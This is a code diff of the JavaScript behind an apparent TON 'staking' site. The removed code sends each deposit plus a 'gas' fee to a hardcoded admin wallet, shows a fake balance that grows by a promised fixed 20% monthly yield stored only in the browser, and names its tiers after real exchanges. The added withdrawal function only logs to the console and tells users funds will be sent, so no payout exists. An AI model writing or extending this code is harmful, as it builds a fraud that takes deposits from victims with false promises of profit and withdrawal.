@@ -1,122 +1,32 @@
-const ADMIN_WALLET = "UQCcMrZZkHhi0rpjh_LL3E4AiTXICYTuBcqRpcJ-KKEt8bO1";
-let selectedTier = null;
-let activeStakingAmount = parseFloat(localStorage.getItem('stakedBalance')) || 0;
-
-const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-    manifestUrl: 'https://squardzbrain20.github.io/flux-staking/tonconnect-manifest.json',
-    buttonRootId: 'ton-connect-button'
-});
-
-const TIERS = [
-    { name: 'Binance', min: 10, color: '#F3BA2F' },
-    { name: 'Bitget', min: 100, color: '#00F0FF' },
-    { name: 'OKX', min: 500, color: '#FFFFFF' },
-    { name: 'MEXC', min: 2500, color: '#0052FF' },
-    { name: 'KuCoin', min: 10000, color: '#24AE8F' }
-];
-
-// Initialize UI
-function init() {
-    renderTiers();
-    updateBalanceDisplay();
-    startYieldAnimation();
-}
-
-function updateBalanceDisplay() {
-    document.getElementById('user-balance').innerText = `$${activeStakingAmount.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
-}
-
-// Live Profit Animation (Calculates share of 20% monthly yield per second)
-function startYieldAnimation() {
-    setInterval(() => {
-        if (activeStakingAmount > 0) {
-            // 20% per month = ~0.000000077 per second per dollar
-            const monthlyRate = 0.20;
-            const perSecondRate = monthlyRate / (30 * 24 * 60 * 60);
-            const profitIncrement = activeStakingAmount * perSecondRate;
-            
-            activeStakingAmount += profitIncrement;
-            localStorage.setItem('stakedBalance', activeStakingAmount);
-            updateBalanceDisplay();
-        }
-    }, 1000);
-}
-
-function openModal(tier) {
-    selectedTier = tier;
-    const gas = tier.min * 0.03;
-    document.getElementById('modal-title').innerText = `${tier.name} Staking`;
-    document.getElementById('modal-amount').innerText = `$${tier.min.toLocaleString()}`;
-    document.getElementById('modal-gas').innerText = `$${gas.toFixed(2)}`;
-    document.getElementById('staking-modal').classList.remove('hidden');
-}
-
-function closeModal() {
-    document.getElementById('staking-modal').classList.add('hidden');
-}
-
-async function confirmTransaction() {
-    if (!tonConnectUI.connected) return alert("Please connect wallet!");
-    
-    const gasFee = selectedTier.min * 0.03;
-    const totalInUSD = selectedTier.min + gasFee;
-    
-    // Note: This assumes 1 TON = 1 USD for calculation. 
-    // For real production, you'd multiply totalInUSD by current TON price.
-    const tonAmount = totalInUSD; 
-
-    const transaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 360,
-        messages: [{
-            address: ADMIN_WALLET,
-            amount: (tonAmount * 1000000000).toString(), 
-            payload: "" 
-        }]
-    };
-
-    try {
-        const result = await tonConnectUI.sendTransaction(transaction);
-        if (result) {
-            closeModal();
-            // Reflect deposit immediately
-            activeStakingAmount += selectedTier.min;
-            localStorage.setItem('stakedBalance', activeStakingAmount);
-            updateBalanceDisplay();
-            alert("Transaction Confirmed! Your 20% yield is now generating.");
-        }
-    } catch (e) {
-        console.error(e);
-        alert("Transaction failed or cancelled.");
+// Add this to your existing script
+async function handleWithdraw() {
+    // 1. Check if the user is connected
+    if (!tonConnectUI.connected) {
+        alert("Please connect your wallet to identify your account.");
+        return;
     }
-}
 
-function openWithdraw() {
-    if (activeStakingAmount <= 0) return alert("No funds available.");
-    alert("Withdrawal request for $" + activeStakingAmount.toFixed(2) + " submitted to admin.");
-}
+    // 2. Get the user's address automatically
+    const userAddress = tonConnectUI.account.address;
+    const amountToWithdraw = activeStakingAmount;
 
-function renderTiers() {
-    const list = document.getElementById('tier-list');
-    list.innerHTML = '<p class="text-gray-600 text-[10px] font-bold uppercase ml-1">Staking Plans (20% Monthly)</p>';
-    TIERS.forEach(tier => {
-        const div = document.createElement('div');
-        div.className = 'glass p-5 rounded-2xl flex justify-between items-center cursor-pointer active:scale-95 transition-all';
-        div.innerHTML = `
-            <div class="flex items-center gap-4">
-                <div class="w-10 h-10 rounded-full flex items-center justify-center border-2 font-black text-xs" style="border-color: ${tier.color}40; color: ${tier.color}">${tier.name[0]}</div>
-                <div>
-                    <div class="font-bold text-sm text-white">${tier.name}</div>
-                    <div class="text-[10px] text-gray-500 uppercase font-bold tracking-tighter">Min Deposit: $${tier.min.toLocaleString()}</div>
-                </div>
-            </div>
-            <div class="text-right">
-                <div class="text-green-400 font-black">20%</div>
-                <div class="text-[8px] text-gray-600 uppercase font-bold">Fixed PnL</div>
-            </div>
-        `;
-        div.onclick = () => openModal(tier);
-        list.appendChild(div);
-    });
-}
+    if (amountToWithdraw <= 0) {
+        alert("You have no funds to withdraw.");
+        return;
+    }
 
-init();
+    // 3. The "Request" Logic
+    // In a production app, you would send this data to your database/API.
+    console.log(`Withdrawal Request: 
+        User: ${userAddress}
+        Amount: $${amountToWithdraw.toFixed(2)}
+    `);
+
+    // 4. UI Feedback
+    alert(`Withdrawal request for $${amountToWithdraw.toFixed(2)} submitted!\n\nFunds will be sent to:\n${userAddress.slice(0,6)}...${userAddress.slice(-6)}`);
+    
+    // Optional: Reset balance after request (only do this if your backend is recording it!)
+    // activeStakingAmount = 0;
+    // localStorage.setItem('stakedBalance', 0);
+    // updateBalanceDisplay();
+}
